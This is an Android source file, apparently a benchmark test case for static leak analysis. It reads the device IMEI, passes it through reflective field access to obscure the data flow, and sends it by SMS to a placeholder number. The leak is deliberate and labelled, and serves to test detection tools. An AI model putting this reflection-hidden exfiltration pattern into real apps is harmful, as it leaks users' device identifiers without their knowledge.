package lu.uni.snt.reflection13;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;

import lu.uni.snt.reflection13.R;
import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

/**
 * @testcase_name Reflection13
 * @version 0.1
 * @author SnT, University of Luxembourg 
 * @author_mail li.li@uni.lu
 * 
 * @description A class instance is created using reflection with specific constructor (getConstructor). 
 * Sensitive data is stored into a field through reflection, and read back using a getter and then leaked. 
 * No type information on the target class is used.
 * @dataflow onCreate: source -> bc.imei -> sink
 * @number_of_leaks 1
 * @challenges The analysis must be able to handle constructor-based reflective class instantiations and 
 * field-based reflective access and most importantly field arrays (getFields).
 */
public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		
		TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		String deviceid = telephonyManager.getDeviceId(); //source
		
		try {
			Class<?> cls = Class.forName("lu.uni.snt.reflection13.ConcreteClass");
			
			Object o = cls.getConstructor(String.class).newInstance("");
			
			Field[] fs = cls.getFields();
			
			for (Field f : fs)
			{
				if ("imei".equals(f.getName()))
				{
					f.set(o, deviceid);
					break;
				}
			}
			
			Field f2 = cls.getField("imei");
			String s = (String) f2.get(o);
			
			SmsManager sms = SmsManager.getDefault();
	        sms.sendTextMessage("+49 1234", null, s, null, null);   //sink, leak
		} catch (InstantiationException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IllegalAccessException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (ClassNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (NoSuchMethodException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IllegalArgumentException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (InvocationTargetException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (NoSuchFieldException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
}
